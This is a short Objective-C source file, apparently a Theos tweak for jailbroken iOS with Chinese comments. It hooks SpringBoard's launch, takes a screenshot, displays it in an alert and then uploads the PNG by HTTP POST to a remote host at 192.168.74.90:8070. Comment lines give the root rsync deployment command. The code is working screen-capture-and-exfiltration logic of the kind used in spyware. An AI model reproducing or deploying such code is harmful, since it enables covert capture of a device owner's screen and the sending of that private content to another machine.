///  rsync ./Snapshot.dylib root@192.168.74.57:/Library/MobileSubstrate/DynamicLibraries

/// killall -HUP SpringBoard

#import <UIKit/UIKit.h>
@interface SBScreenshotManager: NSObject
- (void)saveScreenshotsWithCompletion:(id)sender;
    @end
@interface SpringBoard: NSObject
+ (id)sharedApplication;
- (id)screenshotManager;
@end

%hook SpringBoard

-(void)applicationDidFinishLaunching: (id)application  //需要hook的消息名
{
　　%orig; //执行原方法

    SBScreenshotManager *manager = [[%c(SpringBoard) sharedApplication] screenshotManager];
    [manager saveScreenshotsWithCompletion:^(id sth) {
        UIImage *img = nil;
        for (NSString *key in sth) {
            img = sth[key];
        }
        
        　　UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"Welcome" message:[NSString stringWithFormat:@"%@", img] delegate:self cancelButtonTitle:@"Thanks" otherButtonTitles:nil];
        　　[alert show];
        　　[alert release];
        
        NSData *imageData = UIImagePNGRepresentation(img);
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://192.168.74.90:8070"]];
        request.HTTPMethod = @"POST";
        [[[NSURLSession sharedSession] uploadTaskWithRequest:request fromData:imageData] resume];
    }];

}

%end
